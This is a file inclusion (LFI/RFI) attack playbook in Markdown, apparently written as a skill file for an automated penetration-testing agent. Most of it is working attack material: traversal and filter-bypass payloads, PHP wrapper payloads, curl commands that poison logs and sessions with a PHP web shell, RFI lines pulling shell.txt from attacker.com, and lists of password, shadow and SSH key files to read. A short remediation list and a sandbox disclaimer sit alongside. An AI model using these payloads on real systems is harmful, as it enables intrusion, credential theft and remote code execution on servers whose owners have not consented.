# File Inclusion (LFI/RFI) — Skill Playbook

**Mitre ATT&CK ID:** T1190 (Exploit Public-Facing Application), T1005 (Data from Local System)
**OWASP Mapping:** A03:2021 – Injection
**Severity:** High / Critical
**Last Updated:** 2026-08-02

---

## Metadata

```yaml
skill_id: file-inclusion-v2
category: penetration-testing
author: HiveBreach
mitre_attack_id: T1190
owasp_mapping:
  - A03:2021-Injection
tags:
  - lfi
  - rfi
  - file-inclusion
  - path-traversal
  - web-application
  - T1190
  - T1005
  - T1574.001
environments:
  - web
  - php
  - java
  - asp-net
  - cgi
verification_required: sandbox
```

---

## 1. Detection

### 1.1 Entry Point Enumeration

| Functionality | Parameters | Languages |
|---|---|---|
| Language/localization | `lang`, `language`, `locale` | PHP, Java, ASP.NET |
| Template loading | `template`, `view`, `page` | PHP, Python, Node |
| File download | `file`, `download`, `path` | All |
| Document viewer | `doc`, `pdf`, `read` | Java, PHP |
| Static resource | `img`, `css`, `js` | All |
| Backup/export | `export`, `backup` | All |

### 1.2 Detection Patterns (PayloadsAllTheThings)

**Basic LFI:**
```
?page=../../../etc/passwd
?file=../../../../etc/passwd
?lang=../../../../etc/passwd
?template=../../../../etc/passwd
```

**Encoded LFI:**
```
%2e%2e%2f%2e%2e%2f%2e%2e%2fetc/passwd
..%2f..%2f..%2fetc%2fpasswd
%252e%252e%252fetc%252fpasswd (double URL encode)
....//....//....//etc/passwd
..\..\..\windows\win.ini (Windows)
```

**Filter bypass:**
```
/etc/passwd%00 (null byte - older PHP)
/etc/passwd/. 
/etc/passwd%00.jpg
..%2f..%2f..%2fetc%2fpasswd%00.jpg
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/convert.base64-encode/resource=config.php
```

### 1.3 PHP Wrappers (HackTricks)

```
php://filter/convert.base64-encode/resource=index.php
php://filter/convert.base64-encode/resource=config.php
php://filter/convert.base64-encode/resource=/etc/passwd
php://filter/zlib.deflate/convert.base64-encode/resource=index.php
php://input (POST body → code execution)
data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8%2B (code execution)
expect://id (command execution if extension enabled)
```

### 1.4 Other Languages

**Java:**
```
/WEB-INF/web.xml
/WEB-INF/classes/application.properties
/META-INF/MANIFEST.MF
```

**ASP.NET:**
```
/web.config
/Global.asax
```

**Python:**
```
/app.py
/requirements.txt
```

---

## 2. Confirmation

### 2.1 File Content Verification

```bash
# Confirm /etc/passwd leak
curl "https://target.com/page?file=../../../etc/passwd"
# Look for: root:x:0:0:root:/root:/bin/bash

# Base64 encoded (PHP filter)
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
# Decode: echo 'BASE64' | base64 -d

# Windows
curl "https://target.com/page?file=..\\..\\..\\windows\\win.ini"
# Look for: [fonts], [extensions]
```

### 2.2 Log Poisoning Confirmation

```
# Inject PHP code in User-Agent
curl -H "User-Agent: <?php system($_GET['c']); ?>" "https://target.com/"

# Access log file
curl "https://target.com/page?file=/var/log/apache2/access.log&c=id"
curl "https://target.com/page?file=/var/log/nginx/access.log&c=id"
curl "https://target.com/page?file=/var/log/auth.log&c=id"
```

---

## 3. Exploitation

### 3.1 Sensitive File Disclosure

**Linux:**
```
/etc/passwd
/etc/shadow
/etc/hosts
/etc/hostname
/etc/resolv.conf
/etc/apache2/sites-enabled/000-default.conf
/etc/nginx/nginx.conf
/var/www/html/config.php
/var/www/html/.env
/var/log/apache2/access.log
/var/log/auth.log
/proc/self/environ
/proc/version
/proc/cmdline
/proc/net/tcp
/root/.ssh/id_rsa
/home/USER/.ssh/authorized_keys
/home/USER/.bash_history
```

**Windows:**
```
C:\Windows\win.ini
C:\Windows\System32\drivers\etc\hosts
C:\inetpub\wwwroot\web.config
C:\inetpub\wwwroot\Global.asax
C:\Windows\System32\config\SAM
C:\Users\USER\AppData\Roaming\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history.txt
```

### 3.2 PHP Filter Chain to RCE

**php://filter resource read:**
```bash
# Read source code
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=index.php"
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=config.php"
curl "https://target.com/page?file=php://filter/convert.base64-encode/resource=db.php"
```

**data:// wrapper (if allow_url_include=On):**
```bash
# Generate base64 payload
echo '<?php system($_GET["cmd"]); ?>' | base64
# PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8+

# Execute
curl "https://target.com/page?file=data://text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWyJjbWQiXSk7ID8%2B&cmd=id"
```

**php://input (if allow_url_include=On):**
```bash
curl -d '<?php system("id"); ?>' "https://target.com/page?file=php://input"
```

### 3.3 Log Poisoning to RCE

**Apache:**
```bash
# Inject payload in User-Agent
curl -H "User-Agent: <?php system($_GET['c']); ?>" "https://target.com/"

# Access via LFI
curl "https://target.com/page?file=/var/log/apache2/access.log&c=id"
curl "https://target.com/page?file=/var/log/apache2/error.log&c=id"
```

**Nginx:**
```bash
curl -H "User-Agent: <?php system($_GET['c']); ?>" "https://target.com/"
curl "https://target.com/page?file=/var/log/nginx/access.log&c=id"
```

**System logs:**
```bash
curl -H "User-Agent: <?php system($_GET['c']); ?>" "https://target.com/"
curl "https://target.com/page?file=/var/log/auth.log&c=id"
curl "https://target.com/page?file=/proc/self/environ&c=id"
```

### 3.4 Session File Poisoning

```bash
# Inject PHP code in session value
# PHP session files stored in /var/lib/php/sessions/sess_<SESSION_ID>
curl -H "Cookie: PHPSESSID=test" -d 'data=<?php system("id"); ?>' "https://target.com/"

# Access session file via LFI
curl "https://target.com/page?file=/var/lib/php/sessions/sess_test"
```

### 3.5 Remote File Inclusion (RFI)

```bash
# If allow_url_include=On
curl "https://target.com/page?file=http://attacker.com/shell.txt"
curl "https://target.com/page?file=https://attacker.com/shell.txt"
curl "https://target.com/page?file=ftp://attacker.com/shell.txt"
curl "https://target.com/page?file=data://text/plain;base64,PD9waHAgcGhwaW5mbygpOz8+"
```

### 3.6 Windows LFI Exploitation

```
// Read win.ini
..\\..\\..\\windows\\win.ini

// IIS logs
C:\inetpub\logs\LogFiles\W3SVC1\ex120802.log

// Poison via URL
http://target.com/<%25code%25> → accessed via LFI
```

---

## 4. Tool-Specific Guidance

### 4.1 LFISuite
```bash
python3 lfisuite.py
# Options: [1] LFI, [2] PHP Info, [3] Reverse Shell
```

### 4.2 Kadimus (LFI to RCE)
```bash
kadimus -u "https://target.com/page?file=index.php"
kadimus -u "https://target.com/page?file=index.php" --detect-rfi
kadimus -u "https://target.com/page?file=index.php" --shell
kadimus -u "https://target.com/page?file=index.php" --exploit php://filter
```

### 4.3 PHPFuck / PHP Filter Chains

```bash
# PHP filter chain generator (fuzzer for filter chain RCE)
python3 php_filter_chain_generator.py --chain '<?php system("id"); ?>'
```

### 4.4 Nuclei LFI templates
```bash
nuclei -u https://target.com -t ~/nuclei-templates/vulnerabilities/lfi/ -jsonl lfi.jsonl
```

---

## 5. PoC Generation

### PoC Template

```markdown
## LFI/RFI — [FINDING_ID]

**URL:** https://target.com/page
**Parameter:** file
**Type:** LFI (file read) / RFI (remote code execution)
**Wrapper:** php://filter / data:// / php://input / N/A

### Payload
```
?file=../../../../etc/passwd
```

### Evidence
```
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
```

### Impact
- File read: YES (/etc/passwd, /app/config.php)
- Source disclosure: YES (config.php, index.php)
- RCE achieved: YES/NO (via log poisoning / php://input / RFI)
- Credentials leaked: YES/NO (DB creds in config)

### Remediation
- Use allow-listed template names
- Whitelist valid file paths
- Disable allow_url_include
- Disable dangerous wrappers
- Validate/normalize paths
- Run app with least privilege

### Reproduction Steps
1. Send `https://target.com/page?file=../../../../etc/passwd`
2. Observe /etc/passwd contents
3. Read config: `?file=php://filter/convert.base64-encode/resource=config.php`
4. Attempt RCE via log poisoning
```

---

## 6. Verification (Sandbox)

### Sandbox Checklist
- [ ] Reproduction in isolated environment
- [ ] Multiple wrappers tested
- [ ] Impact scope confirmed
- [ ] No sensitive data beyond proof extracted
- [ ] RCE tested only in sandbox

### Prohibited Actions
- Reading real credentials beyond proof
- Uploading files to production
- Executing commands on production without approval
- Modifying system state

---

## 7. LFI Payload Cheat Sheet (PayloadsAllTheThings)

### Linux Path Traversal
```
../../../etc/passwd
../../../../etc/passwd
../../../../../etc/passwd
..%2f..%2f..%2fetc%2fpasswd
..%252f..%252f..%252fetc%252fpasswd
....//....//....//etc/passwd
..;/..;/..;/etc/passwd (Tomcat)
```

### PHP Wrappers
```
php://filter/convert.base64-encode/resource=FILE
php://filter/zlib.deflate/convert.base64-encode/resource=FILE
php://input
data://text/plain;base64,PAYLOAD
expect://COMMAND
phar://archive.phar/file.txt
zip://archive.zip#file.txt
```

### Path Filters
```
/etc/passwd%00
/etc/passwd%00.jpg
/etc/passwd/.
/etc/passwd/%2e%2e
```

### WAF Bypass
```
..%2f (URL encoded)
..%c0%af (UTF-8 overlong)
..%c1%9c (Windows path)
....// (double slash)
....\\ (Windows)
..\..\..\..\ (Windows)
%252e%252e%252f (double encoded)
```

---

## 8. Related Techniques (MITRE ATT&CK Mapping)

| Technique ID | Name | Relation |
|---|---|---|
| T1190 | Exploit Public-Facing Application | Initial access |
| T1005 | Data from Local System | File disclosure |
| T1083 | File and Directory Discovery | Enumeration |
| T1213 | Data from Information Repositories | Config/data extraction |
| T1505.003 | Web Shell | Persistence via file write |
| T1574.001 | DLL Search Order Hijacking | Windows exploitation |
| T1105 | Ingress Tool Transfer | File download |

---

## 9. References

- PayloadsAllTheThings File Inclusion: https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/File%20Inclusion
- HackTricks LFI: https://book.hacktricks.xyz/pentesting-web/file-inclusion
- PortSwigger File Path Traversal: https://portswigger.net/web-security/file-path-traversal
- PHP filter chain generator: https://github.com/synacktiv/php_filter_chain_generator

---

*This playbook is for authorised security testing only. All verification must occur in sandbox environments.*